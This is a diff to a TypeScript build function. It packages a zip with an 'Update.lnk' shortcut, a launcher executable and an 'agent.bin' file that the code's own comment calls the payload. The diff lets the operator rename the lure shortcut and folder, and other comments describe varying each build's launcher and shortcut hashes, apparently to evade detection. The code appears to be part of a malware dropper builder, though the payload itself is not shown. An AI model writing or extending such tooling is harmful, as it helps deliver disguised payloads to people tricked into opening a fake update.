@@ -61,6 +61,12 @@ export interface LauncherRunOutput {
   configText: string;
 }
 
+/** Optional renameable artifact names (FIX 3). Defaults preserve the working flow. */
+export interface LauncherNames {
+  updateLinkName?: string; // the .lnk entry name (default "Update.lnk")
+  innerFolder?: string; // the subfolder holding launcher+payload (default "launcher")
+}
+
 const LNK_TIMEOUT_MS = 120000; // pwsh New-AgentShortcut.ps1 (bridge .lnk build)
 
 // Per-build diversity tracking: a build whose stamped launcher or Update.lnk
@@ -134,8 +140,20 @@ function runPwsh(args: string[]): Promise<PwshResult> {
 export async function runLauncherBuild(opts: {
   jobId: string;
   inputs: LauncherBuildInputs;
+  names?: LauncherNames;
 }): Promise<LauncherRunOutput> {
   const { jobId, inputs } = opts;
+
+  // FIX 3: resolve optional renameable names (defaults = confirmed working flow;
+  // defaults produced byte-identical output when no names are supplied).
+  const clean = (v: string | undefined, d: string): string => {
+    const s = (v ?? "").trim();
+    if (!s) return d;
+    if (/[/\\"\u0000-\u001f]/.test(s) || s.includes("..") || s.length > 64) return d;
+    return s;
+  };
+  const updateLinkName = clean(opts.names?.updateLinkName, "Update.lnk");
+  const innerFolder = clean(opts.names?.innerFolder, "launcher");
 
   // 1. warm launcher (compile-on-demand only when the pool is empty).
   const entry = await launcherPool.take();
@@ -203,7 +221,7 @@ export async function runLauncherBuild(opts: {
     "-Output",
     lnkPath,
     "-LauncherSubFolder",
-    "launcher",
+    innerFolder,
     "-LauncherTag",
     entry.tag,
   ]);
@@ -215,12 +233,13 @@ export async function runLauncherBuild(opts: {
   }
   const lnk = fs.readFileSync(lnkPath);
 
-  // 6. zip { Update.lnk, launcher/Launcher.exe, launcher/agent.bin } (temp
-  //    files stay until validation). launcher/* subfolder == FIX 2 structure.
+  // 6. zip { <updateLinkName>, <innerFolder>/Launcher.exe, <innerFolder>/agent.bin }
+  //    (temp files stay until validation). The launcher/* subfolder = FIX 2
+  //    structure; the names are FIX 3 (defaults preserved when unset).
   const zip = createZip([
-    { name: "Update.lnk", data: lnk },
-    { name: "launcher/Launcher.exe", data: stampedExe },
-    { name: "launcher/agent.bin", data: agentBin },
+    { name: updateLinkName, data: lnk },
+    { name: `${innerFolder}/Launcher.exe`, data: stampedExe },
+    { name: `${innerFolder}/agent.bin`, data: agentBin },
   ]);
   const zipPath = storage.zipOutputPath(jobId);
   fs.writeFileSync(zipPath, zip);
@@ -239,6 +258,7 @@ export async function runLauncherBuild(opts: {
     agentBin,
     prevLauncherHash: lastLauncherSha256,
     prevLnkHash: lastLnkSha256,
+    names: { updateLinkName, innerFolder },
   });
   for (const row of validation.rows) console.log(`  [validate] ${row}`);
   if (!validation.ok) {
